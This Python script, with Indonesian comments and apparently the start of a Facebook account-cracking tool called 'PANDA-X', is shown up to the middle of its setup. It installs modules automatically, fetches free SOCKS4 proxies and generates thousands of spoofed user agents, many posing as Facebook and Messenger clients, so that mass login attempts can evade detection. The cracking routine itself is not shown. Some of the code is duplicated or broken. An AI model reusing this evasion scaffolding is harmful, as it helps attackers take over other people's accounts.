##------------------------------------------------------------------->
###hi gaes:) Hai bray🌝 Script ini 70% Hasil Recode Yaa, 
### jadi pastinya script ini 100% Free, 
###Tetap Bersyukur apa pun hasilnya yaa, okay
###------------------------------------------------------------------->

###------------------------------------------------------------------>
#     *JANGGAN DI PREMIN YA BANGSAD:)
###------------------------------------------------------------------>
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
import os, sys, re, time, requests, calendar, random, bs4, uuid, json, subprocess, base64
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn
from concurrent.futures import ThreadPoolExecutor as thread
from concurrent.futures import ThreadPoolExecutor as tred
import requests,bs4,json,os,sys,random,datetime,time,re
from rich.markdown import Markdown as mark
from licensing.methods import Key, Helpers
from rich.columns import Columns as col
from bs4 import BeautifulSoup as parser
from rich.console import Console as sol
import requests,re,rich,sys,os,json,time
from bs4 import BeautifulSoup as sop
from rich.panel import Panel as panel
from rich.console import Group as gp
from bs4 import BeautifulSoup as par
from rich.panel import Panel as nel
from rich.columns import Columns
from rich.table import Table as me
from rich.console import Console
from rich.text import Text as tekz
from rich.progress import track
from rich import print as prints
from rich import print as cetak
from rich import print as rprint
from rich import print as cetak
from licensing.models import *
from rich.panel import Panel
from rich.table import Table
import urllib3,rich,base64
from rich.tree import Tree
from time import sleep
from rich import pretty
import itertools
import threading
import getpass
console = Console()
ses = requests.Session()
sound = []
login = []
babi = []
loop = 0
andro = []
dump = []
memek = []
done = False
ualu,ualuh = [],[]
##sys.stdout.write('\x1b]2;PANDA-X 7.0 VERSION\x07')
###------------------------------------------------------------------>
#     *CEK WARNA RANDOM
###------------------------------------------------------------------>
try:
	file_color = open("data/theme_color","r").read()
	color_text = file_color.split("|")[0]
	color_panel = file_color.split("|")[1,2]
	
except:
	junWik = "#00C8FF"
	stenly = "#FFFF00"
	mat = "#FFFFFF"
	fikri = "#00FF00"
	sabi = "#FF0000"
	color_panel = random.choice([sabi,fikri,stenly,mat])

tulisan=[]

M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
P2 = "[#FFFFFF]" # PUTIH
tulisan = random.choice([H2,K2,B2,P2])


try:
	import requests
except ImportError:
	prints(Panel(f"""{H2}• {P2}Modul requests Proses {H2}•""",width=55,padding=(0,12),style=f"{color_panel}"))
	os.system('pip install requests && pip install mechanize ')

try:
	import licensing
except ImportError:
	prints(Panel(f"""{H2}• {P2}Modul licensing Proses {H2}•""",width=55,padding=(0,12),style=f"{color_panel}"))
	os.system('pip install licensing')
	
try:
	import rich
except ImportError:
	prints(Panel(f"""{H2}• {P2}Modul rich Proses {H2}•""",width=55,padding=(0,15),style=f"{color_panel}"))
	os.system('pip install rich')

try:
	import stdiomask
except ImportError:
	prints(Panel(f"""{H2}• {P2}Modul stdiomask Proses {H2}•""",width=55,padding=(0,12),style=f"{color_panel}"))
	os.system('pip install stdiomask')
	
try:
	import flask
except ImportError:
	prints(Panel(f"""{H2}• {P2}Modul flask Proses {H2}•""",width=55,padding=(0,15),style=f"{color_panel}"))
	os.system('pip install flask')
###------------------------------------------------------------------>
#     *USER AGENT APPEND
###------------------------------------------------------------------>
id,id2,loop,ok,cp,akun,oprek,lisensiku,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[]
munculapk=['no']
cokbrut=[]
method = []
pwpluss,pwnya=[],[]
pretty.install()
CON=sol()
ugen2=[]
ugen=[]
cokbrut=[]
dia=[]
say=[]
lisensikuni,lisensiku=[],[]
ses=requests.Session()
princp=[]
eist=[]
wa = Console()
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=80000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	cetak(panel('Koneksi Internet Anda Tidak Terdeteksi Silahkan Cek Kuota'))
if sys.version_info.major != 3:
	exit(panel("[bold green] type: python main.py \n"))
	prox=open('.prox.txt','r').read().splitlines()
###------------------------------------------------------------------>
#     *USER AGENT RANDOM
###------------------------------------------------------------------>
for xd in range(10000):
	rr = random.randint; rc = random.choice
	aZ = str(rc(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']))
	lordjun = str(rc([f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36']))
	lordjun1 = str(rc([f"Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-G532G Build/MMB29T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/4.2 Chrome/44.0.2403.133 Mobile Safari/537.36"]))
	lordjun2 = str(rc([f"Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG SM-A500FU Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.3 Chrome/38.0.2125.102 Mobile Safari/537.36"]))
	lordjun3 = str(rc([f"Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-G930T1 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/4.0 Chrome/44.0.2403.133 Mobile Safari/537.36"]))
	lordjun4 = str(rc([f"Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-G532G Build/MMB29T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/4.2 Chrome/44.0.2403.133 Mobile Safari/537.36"]))
	lordjun5 = str(rc([f"Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-A9000 Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/4.0 Chrome/44.0.2403.133 Mobile Safari/537.36"]))
	lordjun6 = str(rc([f"Mozilla/5.0 (Linux; Android 6.0.1; SM-N910V Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36"]))
	lordjun7 = str(rc([f"Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900V 4G Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36"]))
	lordjun8 = str(rc([f"Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-N920T Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/4.0 Chrome/44.0.2403.133 Mobile Safari/537.36"]))
	k='Mozilla/5.0 (Linux; Android 7.1.1; SM-J250F Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.185 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/288.0.0.15.118;]'
	matahari14=(f'{k}')
	k='Mozilla/5.0 (Linux; Android 7.1.1; SM-J250F Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/64.0.3282.137 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/394.1.0.51.107;]'
	matahari13=(f'{k}')
	k='Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G955U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.0 Chrome/83.0.4103.106 Mobile Safari/537.36'
	matahari10=(f'{k}')
	k='Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-J200F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.0 Chrome/83.0.4103.106 Mobile Safari/537.36'
	matahari11=(f'{k}')
	k='Mozilla/5.0 (Linux; Android 13; SM-G770F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36'
	matahari12=(f'{k}')
	k='Mozilla/5.0 (Linux; Android 10; SM-G770F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.138 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/215.0.0.9.119;]'
	matahari15=(f'{k}')
	k='Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-G770F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/20.0 Chrome/106.0.5249.126 Mobile Safari/537.36'
	m1=(f'{k}')
	k='Mozilla/5.0 (Linux; Android 13; SM-G770F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.122 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]'
	m2=(f'{k}')
	
	a=random.choice(['3','4','5','6','7','8','9','10','11','12'])
	b=random.choice(['KTUS2206170OS00MP1','KTUS2208100OS00MP2','KTUS2205110OS00MP0','KLEN2203050OS00MR1','KLEN2208200OS00MR2'])
	c=random.choice(['SHARK KLE-H0','SHARK KTUS-H0','PCHM10','PCKM00'])
	e=random.randrange(73,100)
	f=random.randrange(4200,4900)
	g=random.randrange(40,150)
	coy=f'Mozilla/5.0 (Linux; Android {a}; {c} Build/{b}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
	cuy=f'Mozilla/5.0 (Linux; Android {a}; {c} Build/{b}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
	
	a='Mozilla/5.0 (Symbian/3; Series60/'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/535.1'
	qp=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	
	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' en-us; GT-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	pq=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	
	
	
	
	a='Mozilla/5.0 (Symbian/3; Series60/'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/535.1'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	
	aa='Mozilla/5.0 (Windows Mobile 10;'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='Android 10.0; Microsoft; Lumia 950XL)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36 Edge/40.15254.603'
	pc=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	
	aa='Mozilla/5.0 (Windows NT 10.0;'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='WOW64)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Safari/537.36 Vivaldi/6.0.2979.18'
	emu=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'    
	
	aa='Mozilla/5.0 (Windows NT 10.0;'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='WOW64)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Safari/537.36 Vivaldi/6.0.2979.18'
	win=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	
	
	a=random.choice(['3','4','5','6','7','8','9','10','11','12','13'])
	b=random.choice(['OPM1','TP1A','RP1A','PPR1','PKQ1','QP1A','SP1A','RKQ1'])
	yah=random.choice(['SM-M236B','SM-A037G','SM-J701MT','SM-A115U','SM-G610M','SM-J530F','SM-A307FN','SM-A405FN'])
	yeh=random.choice(['SM-J415N','SM-R765T','SM-A730F','SM-A605G','SM-J610F','SM-N9750','SM-G935A'])
	sob=f'Dalvik/2.1.0 (Android {a}; {yeh} Build/{b}.220624.014.194544.001) [FBAN/MessengerLite;FBAV/133.0.0.2.146;FBPN/com.facebook.MLITE;FBLC/en_US;FBBV/248719846;FBCR/Airtel;FBMF/Facebook;Facebook/lge;FBDV/{yeh};FBSV/{a};FBCA'
	sip=f'Dalvik/2.1.0 (Android {a}; {yah} Build/{b}.220624.014.194544.001) [FBAN/MessengerLite;FBAV/133.0.0.2.146;FBPN/com.facebook.MLITE;FBLC/en_US;FBBV/248719846;FBCR/Airtel;FBMF/Facebook;Facebook/lge;FBDV/{yah};FBSV/{a};FBCA'
	
	
	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' en-us; GT-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	tle = random.choice([win,sob,sip,emu])
	#tele = random.choice([win,emu,pc,sob,sip])
	ugen.append(tle)
	ugen2.append(tle)
for t in range(10000):
	rr = random.randint; rc = random.choice
	aZ = str(rc(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']))
	lordjun = str(rc([f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36']))
	lordjun1 = str(rc([f"Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-G532G Build/MMB29T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/4.2 Chrome/44.0.2403.133 Mobile Safari/537.36"]))
	lordjun2 = str(rc([f"Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG SM-A500FU Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.3 Chrome/38.0.2125.102 Mobile Safari/537.36"]))
	lordjun3 = str(rc([f"Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-G930T1 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/4.0 Chrome/44.0.2403.133 Mobile Safari/537.36"]))
	lordjun4 = str(rc([f"Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-G532G Build/MMB29T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/4.2 Chrome/44.0.2403.133 Mobile Safari/537.36"]))
	lordjun5 = str(rc([f"Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-A9000 Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/4.0 Chrome/44.0.2403.133 Mobile Safari/537.36"]))
	lordjun6 = str(rc([f"Mozilla/5.0 (Linux; Android 6.0.1; SM-N910V Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36"]))
	lordjun7 = str(rc([f"Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900V 4G Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36"]))
	lordjun8 = str(rc([f"Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-N920T Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/4.0 Chrome/44.0.2403.133 Mobile Safari/537.36"]))
	k='Mozilla/5.0 (Linux; Android 7.1.1; SM-J250F Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.185 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/288.0.0.15.118;]'
	matahari14=(f'{k}')
	k='Mozilla/5.0 (Linux; Android 7.1.1; SM-J250F Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/64.0.3282.137 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/394.1.0.51.107;]'
	matahari13=(f'{k}')
	k='Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G955U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.0 Chrome/83.0.4103.106 Mobile Safari/537.36'
	matahari10=(f'{k}')
	k='Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-J200F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.0 Chrome/83.0.4103.106 Mobile Safari/537.36'
	matahari11=(f'{k}')
	k='Mozilla/5.0 (Linux; Android 13; SM-G770F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36'
	matahari12=(f'{k}')
	k='Mozilla/5.0 (Linux; Android 10; SM-G770F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.138 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/215.0.0.9.119;]'
	matahari15=(f'{k}')
	k='Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-G770F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/20.0 Chrome/106.0.5249.126 Mobile Safari/537.36'
	m1=(f'{k}')
	k='Mozilla/5.0 (Linux; Android 13; SM-G770F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.122 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]'
	m2=(f'{k}')
	
	a=random.choice(['3','4','5','6','7','8','9','10','11','12'])
	b=random.choice(['KTUS2206170OS00MP1','KTUS2208100OS00MP2','KTUS2205110OS00MP0','KLEN2203050OS00MR1','KLEN2208200OS00MR2'])
	c=random.choice(['SHARK KLE-H0','SHARK KTUS-H0','PCHM10','PCKM00'])
	e=random.randrange(73,100)
	f=random.randrange(4200,4900)
	g=random.randrange(40,150)
	cuy=f'Mozilla/5.0 (Linux; Android {a}; {c} Build/{b}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
	coy=f'Mozilla/5.0 (Linux; Android {a}; {c} Build/{b}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
	
	a='Mozilla/5.0 (Symbian/3; Series60/'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/535.1'
	qp=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	
	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' en-us; GT-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	pq=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	
	
	
	
	a=random.choice(['3','4','5','6','7','8','9','10','11','12'])
	b=random.choice(['OPM1','TP1A','RP1A','PPR1','PKQ1','QP1A','SP1A','RKQ1'])
	c=random.randrange(111111,210000)
	d=random.randrange(11,19)
	e=random.randrange(73,100)
	f=random.randrange(4200,4900)
	g=random.randrange(40,150)
	random1=random.choice(['SM-M236B','SM-A037G','SM-J701MT','SM-A115U','SM-G610M','SM-J530F','SM-A307FN','SM-A405FN'])
	random2=random.choice(['SM-J415N','SM-R765T','SM-A730F','SM-A605G','SM-J610F','SM-N9750','SM-G935A'])
	bintang=f'Mozilla/5.0 (Linux; Android {a}; {random1} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
	bulan=f'Mozilla/5.0 (Linux; Android {a}; {random2} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
	
	
	a='Mozilla/5.0 (Symbian/3; Series60/'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/535.1'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	
	aa='Mozilla/5.0 (Windows NT 10.0;'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='WOW64)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Safari/537.36 Vivaldi/6.0.2979.18'
	emu=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'    
	
	aa='Mozilla/5.0 (Windows Mobile 10;'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='Android 10.0; Microsoft; Lumia 950XL)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36 Edge/40.15254.603'
	pc=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	
	aa='Mozilla/5.0 (Windows NT 10.0;'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='WOW64)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Safari/537.36 Vivaldi/6.0.2979.18'
	win=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	
	
	a=random.choice(['3','4','5','6','7','8','9','10','11','12','13'])
	b=random.choice(['OPM1','TP1A','RP1A','PPR1','PKQ1','QP1A','SP1A','RKQ1'])
	yah=random.choice(['SM-M236B','SM-A037G','SM-J701MT','SM-A115U','SM-G610M','SM-J530F','SM-A307FN','SM-A405FN'])
	yeh=random.choice(['SM-J415N','SM-R765T','SM-A730F','SM-A605G','SM-J610F','SM-N9750','SM-G935A'])
	sob=f'Dalvik/2.1.0 (Android {a}; {yeh} Build/{b}.220624.014.194544.001) [FBAN/MessengerLite;FBAV/133.0.0.2.146;FBPN/com.facebook.MLITE;FBLC/en_US;FBBV/248719846;FBCR/Airtel;FBMF/Facebook;Facebook/lge;FBDV/{yeh};FBSV/{a};FBCA'
	sip=f'Dalvik/2.1.0 (Android {a}; {yah} Build/{b}.220624.014.194544.001) [FBAN/MessengerLite;FBAV/133.0.0.2.146;FBPN/com.facebook.MLITE;FBLC/en_US;FBBV/248719846;FBCR/Airtel;FBMF/Facebook;Facebook/lge;FBDV/{yah};FBSV/{a};FBCA'
	
	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' en-us; GT-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	tle = random.choice([win,sob,sip,emu])
